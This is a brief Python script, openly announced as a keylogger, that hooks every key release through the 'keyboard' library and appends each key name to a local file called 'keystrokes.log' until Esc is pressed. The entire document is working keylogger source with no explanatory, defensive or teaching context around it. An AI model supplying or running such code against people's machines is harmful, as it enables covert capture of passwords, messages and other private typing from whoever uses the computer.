import keyboard

log_file = "keystrokes.log"

def on_key_event(event):
    with open(log_file, "a") as f:
        f.write(event.name + "\n")

keyboard.on_release(on_key_event)

print("Keylogger started. Press 'Esc' to stop.")

# Keep the program running until 'Esc' is pressed
keyboard.wait("esc")
print("Keylogger stopped.")

